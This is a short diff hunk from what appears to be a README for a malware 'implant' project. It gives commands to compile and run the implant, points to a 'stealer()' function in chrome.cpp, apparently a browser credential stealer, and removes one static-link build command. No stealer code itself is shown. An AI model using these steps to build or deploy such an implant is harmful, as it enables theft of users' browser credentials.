@@ -24,4 +24,4 @@
 - To compile, run `make implant`
 - To run the implant, run `./bin/implant.exe`
 - Function 'stealer()' in chrome.cpp implements the stealer
-- Static compile is needed. Run'g++ test.cpp -static -lcrypt32 -lbcrypt  -o test.exe sqlite3.dll'
+- Static compile is needed.
